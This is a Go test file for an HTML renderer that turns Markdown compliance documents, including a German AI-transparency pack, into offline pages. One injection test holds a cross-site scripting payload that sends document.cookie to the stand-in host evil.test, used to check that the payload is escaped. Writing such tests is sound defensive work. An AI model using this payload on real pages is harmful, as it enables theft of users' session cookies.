package report

import (
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/flugschreiber/flugschreiber/internal/evidence"
)

func renderPage(t *testing.T, md string, opts HTMLOptions) string {
	t.Helper()
	out, err := RenderHTML([]byte(md), opts)
	if err != nil {
		t.Fatalf("RenderHTML: %v", err)
	}
	return string(out)
}

// These documents are emailed to regulators and opened offline, sometimes years
// after they were written. A page that needs the network to render correctly
// would leak the fact that it was opened and would eventually stop rendering at
// all.
func TestPageFetchesNothingFromTheNetwork(t *testing.T) {
	page := renderPage(t, "# Title\n\nSome text.\n", HTMLOptions{Version: "v0"})

	for _, forbidden := range []string{"<script", "<link", "<iframe", "<img", "src=", "@import", "url(", "integrity=", "crossorigin"} {
		if strings.Contains(page, forbidden) {
			t.Errorf("the page contains %q, so it is not self-contained", forbidden)
		}
	}
	if !strings.Contains(page, "<style>") {
		t.Error("the stylesheet must be inline, or the page is unstyled offline")
	}
}

func TestPageCarriesPrintAndDarkStyles(t *testing.T) {
	page := renderPage(t, "# Title\n", HTMLOptions{})

	for _, want := range []string{"@media print", "@page", "prefers-color-scheme: dark", "page-break-inside: avoid"} {
		if !strings.Contains(page, want) {
			t.Errorf("the stylesheet is missing %q", want)
		}
	}
}

func TestPageSaysHowManyGapsRemain(t *testing.T) {
	tests := []struct {
		name string
		md   string
		want string
	}{
		{"none", "# T\n\nAll filled in.\n", "Nothing in this document is marked TODO."},
		{"one", "# T\n\n> **TODO:** describe the oversight step for this system\n", "<strong>1</strong> passage in this document is"},
		{"several", "# T\n\n> **TODO:** a\n\n> **TODO:** b\n\n| x | **TODO:** c |\n", "<strong>3</strong> passages in this document are"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			page := renderPage(t, tc.md, HTMLOptions{})
			if !strings.Contains(page, tc.want) {
				t.Errorf("want the page to say %q", tc.want)
			}
		})
	}
}

func TestPageTitleComesFromTheDocumentHeading(t *testing.T) {
	page := renderPage(t, "# Technical documentation: Support-Assistent\n", HTMLOptions{Title: "fallback"})
	if !strings.Contains(page, "<title>Technical documentation: Support-Assistent</title>") {
		t.Error("the document's own heading should name the browser tab")
	}

	page = renderPage(t, "No heading here.\n", HTMLOptions{Title: "fallback"})
	if !strings.Contains(page, "<title>fallback</title>") {
		t.Error("a document with no heading should fall back to the artifact title")
	}
}

func TestPageLanguageIsDeclared(t *testing.T) {
	if page := renderPage(t, "# T\n", HTMLOptions{Lang: "de"}); !strings.Contains(page, `<html lang="de">`) {
		t.Error("the German pack must declare its language")
	}
	if page := renderPage(t, "# T\n", HTMLOptions{}); !strings.Contains(page, `<html lang="en">`) {
		t.Error("the language must default rather than be omitted")
	}
}

// The German pack exists so that a German-speaking data protection officer can
// read it and pass it on. Every word the page adds around the document has to
// be in the document's language, or the artifact is one they have to explain
// before they can forward it.
func TestPageChromeIsInTheDocumentsLanguage(t *testing.T) {
	md := "# Transparenzpaket\n\n## Wen das betrifft\n\n> **TODO:** benennen Sie die verantwortliche Stelle in Ihrer Organisation\n"
	opts := HTMLOptions{Lang: "de", SourceFile: "transparency-article-50-de.md", Version: "v0.1.0-test", Generated: time.Unix(0, 0)}
	page := renderPage(t, md, opts)

	want := []string{
		"Inhaltsverzeichnis",
		"Stelle in diesem Dokument ist mit TODO gekennzeichnet.",
		"Jede benennt, was dort einzutragen ist",
		"Erzeugt aus <code>transparency-article-50-de.md</code> mit Flugschreiber v0.1.0-test am ",
		"Maßgeblich ist die Markdown-Datei",
		"Dies ist eine Dokumentationsgrundlage. Sie stellt keine Konformität her und ist keine Rechtsberatung.",
	}
	for _, w := range want {
		if !strings.Contains(page, w) {
			t.Errorf("the German page is missing %q", w)
		}
	}

	english := []string{
		">Contents<",
		"in this document is marked TODO",
		"in this document are marked TODO",
		"Nothing in this document is marked TODO",
		"needs a person who knows the system",
		"Rendered from",
		"source of truth",
		"documentation input",
		"not legal advice",
	}
	for _, e := range english {
		if strings.Contains(page, e) {
			t.Errorf("the German page still carries the English string %q", e)
		}
	}

	// The plural and the empty case are separate strings and have to be
	// translated too, so they get their own renders.
	plural := renderPage(t, md+"\n> **TODO:** und benennen Sie den Freigabeweg für diesen Text\n", opts)
	if !strings.Contains(plural, "Stellen in diesem Dokument sind mit TODO gekennzeichnet.") {
		t.Error("the German plural of the TODO banner is missing")
	}
	clean := renderPage(t, "# Transparenzpaket\n\nAlles ausgefüllt.\n", opts)
	if !strings.Contains(clean, "Keine Stelle in diesem Dokument ist mit TODO gekennzeichnet.") {
		t.Error("the German empty case of the TODO banner is missing")
	}
}

func TestPageChromeFallsBackToEnglish(t *testing.T) {
	for _, lang := range []string{"", "en", "en-GB", "fr"} {
		page := renderPage(t, "# T\n\n## A\n", HTMLOptions{Lang: lang, SourceFile: "t.md"})
		if !strings.Contains(page, ">Contents<") || !strings.Contains(page, "Rendered from") {
			t.Errorf("lang %q lost its page furniture instead of falling back to English", lang)
		}
	}
	if page := renderPage(t, "# T\n\n## A\n", HTMLOptions{Lang: "de-AT"}); !strings.Contains(page, "Inhaltsverzeichnis") {
		t.Error("a regional German tag should still get the German chrome")
	}
}

// attrValues returns every value of the named attribute in the page.
func attrValues(page, attr string) []string {
	var out []string
	needle := " " + attr + `="`
	for i := 0; ; {
		j := strings.Index(page[i:], needle)
		if j < 0 {
			return out
		}
		start := i + j + len(needle)
		end := strings.IndexByte(page[start:], '"')
		if end < 0 {
			return out
		}
		out = append(out, page[start:start+end])
		i = start + end
	}
}

func TestEveryTableOfContentsLinkResolvesToAHeading(t *testing.T) {
	page := renderPage(t, "# Title\n\n## Ausführliche Systembeschreibung\n\n## Retention\n\n### Retention\n", HTMLOptions{})

	ids := map[string]bool{}
	for _, id := range attrValues(page, "id") {
		ids[id] = true
	}
	links := 0
	for _, href := range attrValues(page, "href") {
		if !strings.HasPrefix(href, "#") {
			continue
		}
		fragment, err := url.PathUnescape(href[1:])
		if err != nil {
			t.Fatalf("undecodable fragment %q: %v", href, err)
		}
		if !ids[fragment] {
			t.Errorf("the contents link %q points at no heading in the page", href)
		}
		links++
	}
	if links != 3 {
		t.Errorf("got %d contents links, want one per level-2 and level-3 heading", links)
	}
	if strings.Contains(page, `href="#title"`) {
		t.Error("the document title is shown above the contents and must not also be listed in it")
	}
}

func TestHostileDeploymentValuesCannotInjectMarkupIntoThePage(t *testing.T) {
	// Organisation, purpose and contact come from configuration; model
	// identifiers come from traffic. All of it lands in these documents.
	hostile := `<script>fetch("//evil.test?c="+document.cookie)</script>`
	md := "# Technical documentation: " + hostile + "\n\n" +
		"| Field | Value |\n| --- | --- |\n| Organisation | " + hostile + " |\n\n" +
		"> **TODO:** " + hostile + "\n\n" +
		"- [ ] " + hostile + "\n\n```\n" + hostile + "\n```\n"

	page := renderPage(t, md, HTMLOptions{Title: hostile, SourceFile: hostile, Version: hostile, Lang: hostile})

	assertOnlyAllowedTags(t, page)
	if strings.Contains(page, "<script") {
		t.Error("a script tag reached the page")
	}
	// Heading, browser title, table cell, callout, task item and code block.
	if n := strings.Count(page, "&lt;script&gt;"); n < 6 {
		t.Errorf("the hostile string appears escaped only %d times; some occurrence was dropped rather than shown", n)
	}
}

func TestRenderHTMLIsDeterministic(t *testing.T) {
	md := []byte("# T\n\n## A\n\n> **TODO:** something that needs a human\n\n| a | b |\n| ---: | --- |\n| 1 | 2 |\n")
	opts := HTMLOptions{Title: "t", Lang: "en", SourceFile: "t.md", Version: "v0", Generated: time.Unix(0, 0)}

	first, err := RenderHTML(md, opts)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 20; i++ {
		again, err := RenderHTML(md, opts)
		if err != nil {
			t.Fatal(err)
		}
		if string(again) != string(first) {
			t.Fatal("two renders of the same document produced different bytes")
		}
	}
}

func TestGeneratedDocumentsRenderToValidPages(t *testing.T) {
	paths, err := filepath.Glob(filepath.Join("testdata", "golden", "*.md"))
	if err != nil {
		t.Fatal(err)
	}
	if len(paths) == 0 {
		t.Skip("no golden documents to render; run: go test ./internal/report -update")
	}

	for _, path := range paths {
		t.Run(filepath.Base(path), func(t *testing.T) {
			md, err := os.ReadFile(path)
			if err != nil {
				t.Fatal(err)
			}
			page := renderPage(t, string(md), HTMLOptions{SourceFile: filepath.Base(path), Version: "v0.1.0-test"})

			assertOnlyAllowedTags(t, page)
			if opens, closes := strings.Count(page, "<table>"), strings.Count(page, "</table>"); opens != closes {
				t.Errorf("tables opened %d times and closed %d times", opens, closes)
			}
			if strings.Contains(string(md), "\n| --- |") && !strings.Contains(page, "<table>") {
				t.Error("a document containing a Markdown table rendered no table")
			}
			if strings.Count(page, "<blockquote") != strings.Count(page, "</blockquote>") {
				t.Error("unbalanced blockquotes")
			}
			if !strings.Contains(page, "<nav class=\"toc\"") {
				t.Error("a document with headings must get a table of contents")
			}
			// A leftover marker means a block the renderer failed to recognise.
			for _, leftover := range []string{"\n| ---", "\n# ", "\n> **TODO"} {
				if strings.Contains(page, leftover) {
					t.Errorf("unrendered Markdown %q survived into the page", leftover)
				}
			}
		})
	}
}

func TestGenerateProducesAnHTMLPageForEveryDocument(t *testing.T) {
	summary, err := Summarise(t.TempDir(), time.Date(2026, 5, 4, 9, 0, 0, 0, time.UTC))
	if err != nil {
		t.Fatal(err)
	}
	generated, err := Generate(Input{
		Summary: summary, ContentMode: evidence.ModeHash, RetentionDays: 180,
		DataDir: "/var/lib/flugschreiber", Version: "test",
		Now: time.Date(2026, 5, 4, 9, 0, 0, 0, time.UTC),
	})
	if err != nil {
		t.Fatal(err)
	}

	pages := map[string]Artifact{}
	for _, a := range generated.Artifacts {
		if strings.HasSuffix(a.Filename, ".html") {
			pages[a.Filename] = a
		}
	}
	for _, a := range generated.Artifacts {
		if !strings.HasSuffix(a.Filename, ".md") {
			continue
		}
		want := strings.TrimSuffix(a.Filename, ".md") + ".html"
		page, ok := pages[want]
		if !ok {
			t.Errorf("%s has no HTML rendering", a.Filename)
			continue
		}
		if !strings.Contains(string(page.Content), "<code>"+a.Filename+"</code>") {
			t.Errorf("%s does not name the Markdown it was rendered from", want)
		}
	}
	if lang := "lang=\"de\""; !strings.Contains(string(pages["transparency-article-50-de.html"].Content), lang) {
		t.Error("the German pack must be rendered with a German language tag")
	}
}
